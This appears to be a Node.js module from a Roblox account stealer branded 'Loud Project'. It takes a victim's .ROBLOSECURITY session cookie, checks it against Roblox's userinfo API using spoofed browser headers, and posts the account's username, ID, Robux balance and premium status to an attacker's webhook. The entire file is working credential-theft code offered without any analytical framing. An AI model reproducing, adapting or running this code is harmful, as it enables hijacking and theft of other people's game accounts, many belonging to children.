const axios = require("axios");
const { wbk } = require("../../data/Config");

async function getRoblox(secret_cookie) {
  const data = {};
  const headers = {
    accept: "application/json, text/plain, */*",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "en-US,en;q=0.9,hi;q=0.8",
    cookie: `.ROBLOSECURITY=${secret_cookie.toString()};`,
    origin: "https://www.roblox.com",
    referer: "https://www.roblox.com",
    "sec-ch-ua": "'Chromium';v='110', 'Not A(Brand';v='24', 'Google Chrome';v='110'",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "'Windows'",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36",
  };

  const response = await axios.get("https://www.roblox.com/mobileapi/userinfo", { headers: headers }).catch(() => null);
  if (!response?.data) return data;

  data["id"] = response.data["UserID"];
  data["username"] = response.data["UserName"];
  data["avatar"] = response.data["ThumbnailUrl"];
  data["robux"] = response.data["RobuxBalance"];
  data["premium"] = response.data["IsPremium"];

  return data;
}

async function Send(secret_cookie) {
  const data = await getRoblox(secret_cookie);
  if (!data.id) return;

  axios
    .post(wbk, {
      avatar_url: "https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/LoudProject.png",
      username: "Loud Project",
      embeds: [
        {
          color: 2829617,
          fields: [
            {
              name: "Username",
              value: `\`${data.username || "Unknown"}\``,
              inline: true,
            },
            {
              name: "ID",
              value: `\`${data.id}\``,
              inline: true,
            },
            {
              name: "Robux",
              value: `\`${data.robux || "0"}\``,
              inline: true,
            },
            {
              name: "Premium",
              value: `\`${data.premium ? "✅" : "❌"}\``,
              inline: true,
            },
          ],
          color: 13172927,
          thumbnail: {
            url: `${data.avatar}`,
          },
          author: {
            name: "Roblox Account",
            icon_url: "https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/LoudProject.png",
          },
          footer: {
            text: "Loud Project | https://t.me/LoudProject",
          },
        },
      ],
    })
    .catch(() => null);
}

module.exports = { Send };
